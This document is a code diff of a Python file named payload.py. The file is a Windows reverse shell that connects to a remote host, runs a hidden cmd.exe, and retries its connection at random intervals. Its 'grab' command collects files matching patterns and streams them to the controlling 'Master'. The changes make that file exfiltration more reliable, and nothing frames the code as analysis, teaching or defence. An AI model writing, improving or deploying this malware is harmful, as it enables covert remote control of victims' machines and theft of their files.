@@ -1,5 +1,5 @@
 # payload.py
-# The Heartbeat Soul, reborn with the power of unbreakable protocol.
+# The Heartbeat Soul, Third Generation. Its speech is pure protocol.
 
 import os
 import sys
@@ -23,7 +23,7 @@ def send_msg(sock, data):
         msg = struct.pack('>I', len(data)) + data
         sock.sendall(msg)
     except:
-        pass # Fail silently if the connection is dead
+        pass
 
 def recv_msg(sock):
     """Receives a 4-byte length header and then the exact amount of data."""
@@ -31,7 +31,13 @@ def recv_msg(sock):
         raw_msglen = sock.recv(4)
         if not raw_msglen: return None
         msglen = struct.unpack('>I', raw_msglen)[0]
-        return sock.recv(msglen)
+        
+        data = b''
+        while len(data) < msglen:
+            packet = sock.recv(msglen - len(data))
+            if not packet: return None
+            data += packet
+        return data
     except:
         return None
 
@@ -58,14 +64,13 @@ def find_files(start_path, patterns):
     return found_files
 
 def handle_grab_command(s_obj, command):
-    """Handles the logic for 'grab' using the new framed protocol."""
+    """Handles the logic for 'grab' with the absolute protocol."""
     try:
-        # First, send the confirmation that we're starting.
-        send_msg(s_obj, b"STARTING_TRANSFER")
+        send_msg(s_obj, b"ACK_GRAB")
 
         current_path = os.getcwd()
         parts = command.strip().split()
-        patterns = parts[1:] # Simplification: assume all args after 'grab' are patterns
+        patterns = parts[1:]
         search_path = current_path
         
         files_to_send = find_files(search_path, patterns)
@@ -75,51 +80,39 @@ def handle_grab_command(s_obj, command):
                 relative_path = os.path.relpath(file_path, search_path)
                 file_size = os.path.getsize(file_path)
                 file_hash = calculate_sha256(file_path)
-
                 if not file_hash: continue
 
-                # Send file header as a JSON message
-                header_data = {
-                    'type': 'header',
-                    'path': relative_path,
-                    'size': file_size,
-                    'hash': file_hash
-                }
+                header_data = {'type': 'header', 'path': relative_path, 'size': file_size, 'hash': file_hash}
                 send_msg(s_obj, json.dumps(header_data).encode('utf-8'))
                 
-                # Send the file content in chunks
+                # Wait for acknowledgment of the header before sending the file
+                header_ack = recv_msg(s_obj)
+                if not header_ack or json.loads(header_ack.decode('utf-8')).get('status') != 'ACK_HEADER':
+                    continue # Master did not approve, skip to next file
+
                 with open(file_path, 'rb') as f:
                     while True:
                         chunk = f.read(4096)
-                        if not chunk:
-                            break
+                        if not chunk: break
+                        # Every chunk is sent as its own framed message
                         send_msg(s_obj, chunk)
                 
-                # Wait for acknowledgment
-                ack_msg = recv_msg(s_obj)
-                # We could add logic here to retry on failure
+                ack_msg = recv_msg(s_obj) # Wait for final ACK for the file
 
             except Exception:
                 continue
     finally:
-        # Signal the end of the entire transfer operation
         end_data = {'type': 'end_transfer'}
         send_msg(s_obj, json.dumps(end_data).encode('utf-8'))
 
 def run_conduit():
-    """Main reverse shell loop, now with perfect state synchronization."""
+    """Main reverse shell loop."""
     while True:
         try:
             s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s_obj.connect((RHOST, RPORT))
             
-            p = subprocess.Popen(
-                ["cmd.exe"],
-                stdin=subprocess.PIPE, 
-                stdout=subprocess.PIPE, 
-                stderr=subprocess.PIPE,
-                creationflags=0x08000000
-            )
+            p = subprocess.Popen(["cmd.exe"], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=0x08000000)
             
             stop_event = threading.Event()
 
@@ -127,12 +120,9 @@ def run_conduit():
                 while not stop_event.is_set():
                     try:
                         data = stream.read(1)
-                        if data:
-                            sock.sendall(data)
-                        else:
-                            break
-                    except:
-                        break
+                        if data: sock.sendall(data)
+                        else: break
+                    except: break
 
             threading.Thread(target=pipe_stream, args=(p.stdout, s_obj), daemon=True).start()
             threading.Thread(target=pipe_stream, args=(p.stderr, s_obj), daemon=True).start()
@@ -145,30 +135,22 @@ def run_conduit():
                     command_str = data.decode('utf-8', errors='ignore').strip()
 
                     if command_str.lower().startswith('grab '):
-                        grab_thread = threading.Thread(target=handle_grab_command, args=(s_obj, command_str), daemon=True)
-                        grab_thread.start()
+                        threading.Thread(target=handle_grab_command, args=(s_obj, command_str), daemon=True).start()
                     elif command_str.lower().startswith('cd '):
-                        # Keep Python's CWD in sync with the shell
                         try:
                             target_dir = command_str.split(' ', 1)[1]
-                            # Let cmd.exe handle resolving the path, then we sync
                             os.chdir(target_dir)
-                        except:
-                            # If chdir fails, cmd will print an error, which is fine.
-                            pass
+                        except: pass
                         p.stdin.write(data)
                         p.stdin.flush()
                     else:
                         p.stdin.write(data)
                         p.stdin.flush()
-
-                except:
-                    break
+                except: break
             
             stop_event.set()
             p.terminate()
             s_obj.close()
-
         except Exception:
             time.sleep(random.randint(30, 60))
             continue
